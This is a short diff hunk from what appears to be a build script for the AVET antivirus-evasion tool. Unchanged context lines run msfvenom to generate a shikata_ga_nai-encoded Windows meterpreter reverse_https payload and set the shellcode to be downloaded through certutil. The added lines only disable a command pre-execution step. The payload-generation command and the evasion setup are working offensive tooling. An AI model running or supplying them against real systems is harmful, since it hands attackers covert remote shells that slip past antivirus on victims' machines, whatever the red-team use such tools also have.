@@ -29,6 +29,10 @@ LHOST=$GLOBAL_LHOST
 # additionaly to the avet encoder, further encoding should be used
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > output/thepayload.bin
 
+# no command preexec
+set_command_source none
+set_command_exec none
+
 # set shellcode source
 set_payload_source download_certutil
 
